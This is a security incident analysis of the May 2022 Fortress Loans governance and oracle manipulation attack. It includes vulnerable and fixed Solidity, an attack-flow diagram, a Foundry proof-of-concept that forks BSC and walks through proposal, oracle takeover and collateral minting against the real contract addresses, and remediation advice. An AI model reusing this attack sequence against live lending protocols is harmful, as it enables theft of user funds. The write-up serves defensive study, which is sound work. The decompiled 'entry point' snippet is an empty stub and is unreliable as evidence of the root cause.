# Fortress Loans — Governance + Oracle Manipulation Compound Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2022-05-08 |
| **Protocol** | Fortress Loans |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$3,000,000 (1,048 ETH + 400,000 DAI) |
| **Attacker** | [0xA6AF2872176320015f8ddB2ba013B38Cb35d22Ad](https://bscscan.com/address/0xA6AF2872176320015f8ddB2ba013B38Cb35d22Ad) |
| **Attack Contract** | [0xcd337b920678cf35143322ab31ab8977c3463a45](https://bscscan.com/address/0xcd337b920678cf35143322ab31ab8977c3463a45) |
| **Vulnerable Contract** | GovernorAlpha [0xE79ecdB7fEDD413E697F083982BAC29e93d86b2E](https://bscscan.com/address/0xE79ecdB7fEDD413E697F083982BAC29e93d86b2E) |
| **Root Cause** | A governance proposal replaced the Chain oracle's price submitter with the attacker's contract, then drained all 13 lending markets using a manipulated fFTS collateral price |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-05/FortressLoans_exp.sol) |

---
## 1. Vulnerability Overview

Fortress Loans is a BSC-based Compound-fork lending protocol governed by its native governance token (FTS). The attacker executed a two-phase compound attack.

**Phase 1 — Governance Manipulation**: The attacker acquired FTS tokens, submitted Proposal 11, and passed it through voting. The proposal changed the Chain oracle's price submitter to the attacker's contract.

**Phase 2 — Oracle Manipulation + Market Drain**: After the proposal was executed, the attacker's contract submitted a manipulated fFTS price (hundreds of times the real value) to the Chain oracle. Using the inflated fFTS collateral value, the attacker drained all liquidity from 13 lending markets (ETH, USDT, USDC, DAI, etc.).

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable governance + oracle combination (pseudocode)

// Chain oracle: price submitter can be changed via governance
contract Chain {
    address public submitter;  // ❌ Can be changed via governance proposal

    function setSubmitter(address _submitter) external onlyGovernance {
        submitter = _submitter;
    }

    function submit(uint256 price) external {
        require(msg.sender == submitter, "not submitter");
        // ❌ No validity check on submitted price
        latestPrice = price;
    }
}

// GovernorAlpha: low-quorum governance similar to Beanstalk
contract GovernorAlpha {
    uint256 public proposalThreshold = 100_000 * 1e18; // 100,000 FTS
    // ❌ Low quorum + short voting period → can pass silently
    uint256 public quorumVotes = 1_000_000 * 1e18; // Only 1% of total supply required
}

// ✅ Correct pattern
contract ChainFixed {
    // ✅ Price deviation limit enforced
    function submit(uint256 price) external {
        require(msg.sender == submitter, "not submitter");
        uint256 lastPrice = latestPrice;
        // ✅ Cannot deviate more than 10% from the previous price
        require(price <= lastPrice * 110 / 100, "price too high");
        require(price >= lastPrice * 90 / 100, "price too low");
        latestPrice = price;
    }

    // ✅ Timelock applied to submitter changes
    function setSubmitter(address _submitter) external onlyGovernance {
        require(block.timestamp >= submitterChangeTime + 48 hours, "timelock");
        submitter = _submitter;
    }
}
```

---
### On-Chain Source Code

Source: Bytecode decompiled


**Decompiled_0xE79ecdB7.sol** — Entry point:
```solidity
// ❌ Root cause: a governance proposal replaced the Chain oracle's price submitter with the attacker's contract, then drained all 13 lending markets using a manipulated fFTS collateral price
    function proposals(uint256 arg0) external {}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[Preparation]
    │   Acquire 100 ether FTS tokens + 3.02M MAHA
    │
    ├─[Phase 1: Governance Manipulation]
    │   GovernorAlpha.propose(11):
    │       Content: Chain.setSubmitter(attacker_contract)
    │   GovernorAlpha.castVote(11, true)
    │   GovernorAlpha.queue(11)
    │   GovernorAlpha.execute(11)
    │       → Chain.submitter = attacker_contract
    │
    ├─[Phase 2: Oracle Manipulation]
    │   Chain.submit(1,000,000x price)
    │       FortressPriceOracle.getUnderlyingPrice(fFTS) → manipulated price
    │
    ├─[Phase 3: Collateral + Borrowing]
    │   Cointroller.enterMarkets([fFTS])
    │   fFTS.mint(100 FTS) → inflated collateral value
    │   borrow() from each of 13 fToken markets:
    │       fBNB, fETH, fBTC, fUSDT, fUSDC, fDAI ...
    │       → Full liquidity drained
    │
    ├─[Phase 4: Monetization]
    │   BorrowerOperations.openTrove() → Mint ARTHUSD
    │   IVyper.exchange_underlying() → Stablecoin swap
    │   All assets → swapped to USDT
    │
    └─[Loss] ~$3,000,000 (1,048 ETH + 400,000 DAI)
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface IGovernorAlpha {
    function propose(
        address[] memory targets, uint256[] memory values,
        string[] memory signatures, bytes[] memory calldatas,
        string memory description
    ) external returns (uint256);
    function castVote(uint256 proposalId, bool support) external;
    function queue(uint256 proposalId) external;
    function execute(uint256 proposalId) external payable;
}

interface IChain {
    function submit(uint256 price) external;
}

interface IFBep20Delegator {
    function mint(uint256 mintAmount) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function getCash() external view returns (uint256);
}

contract ContractTest is Test {
    IGovernorAlpha gov =
        IGovernorAlpha(0xE79ecdB7fEDD413E697F083982BAC29e93d86b2E);
    IChain chain = IChain(0xc11b687cd6061a6516e23769e4657b6efa25d78e);

    IERC20 FTS  = IERC20(0x4437743ac02957068995c48E08465E0EE1769fBE);
    IERC20 MAHA = IERC20(0xCE86F7fcD3B40791F63B86C3ea3B8B355Ce2685b);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);

    function setUp() public {
        vm.createSelectFork("bsc");
    }

    function testExploit() public {
        // [Phase 1] Governance proposal: change submitter to attacker's contract
        address[] memory targets = new address[](1);
        targets[0] = address(chain);
        uint256[] memory values = new uint256[](1);
        string[] memory sigs = new string[](1);
        bytes[] memory calldatas = new bytes[](1);
        calldatas[0] = abi.encodeWithSignature(
            "setSubmitter(address)", address(this) // Set attacker as submitter
        );

        uint256 proposalId = gov.propose(targets, values, sigs, calldatas, "Proposal 11");

        // [Phase 2] Pass the vote
        gov.castVote(proposalId, true);
        vm.warp(block.timestamp + 2 days);
        gov.queue(proposalId);
        vm.warp(block.timestamp + 1 days);
        gov.execute(proposalId);

        // [Phase 3] Oracle manipulation
        // ⚡ Now `this` is the submitter → can submit arbitrary prices
        chain.submit(type(uint256).max); // Set fFTS price to infinity

        // [Phase 4] Drain all markets using fFTS collateral
        FTS.approve(address(0x854C266b06445794FA543b1d8f6137c35924C9EB), type(uint256).max);
        IFBep20Delegator(0x854C266b06445794FA543b1d8f6137c35924C9EB).mint(100 ether);

        // Execute borrow from each of 13 markets (abbreviated — actually a loop)
        emit log_named_decimal_uint("[Stolen] USDT", USDT.balanceOf(address(this)), 18);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Governance + Oracle manipulation compound attack |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Governance takeover + unrestricted oracle price manipulation |
| **Attack Vector** | Governance proposal → submitter replacement → manipulated price submission → over-borrowing |
| **Preconditions** | Low governance quorum, no oracle price deviation limit |
| **Impact** | All 13 lending market assets drained |

---
## 6. Remediation Recommendations

1. **Governance Quorum + Timelock**: Apply a high quorum and a timelock of at least 48 hours for high-risk operations such as changing the oracle submitter.
2. **Oracle Price Deviation Limit**: Restrict a single submission from changing the price by more than a fixed percentage.
3. **Multi-Oracle Aggregation**: Use multiple independent oracles aggregated by median instead of a single submitter.
4. **Use Verified Oracles (e.g., Chainlink)**: Prefer Chainlink, Pyth, or other battle-tested oracles over custom on-chain oracle implementations.

---
## 7. Lessons Learned

- **Governance → Oracle → Lending chain reaction**: In a system where governance, oracle, and lending are interconnected, a single vulnerability can collapse the entire chain.
- **Fortress Loans vs. Beanstalk**: Both incidents are governance attacks, but Fortress exploited the off-chain timelock period whereas Beanstalk was a single-transaction attack.
- **$3M loss**: Relatively small in scale, but the same pattern is applicable to larger protocols.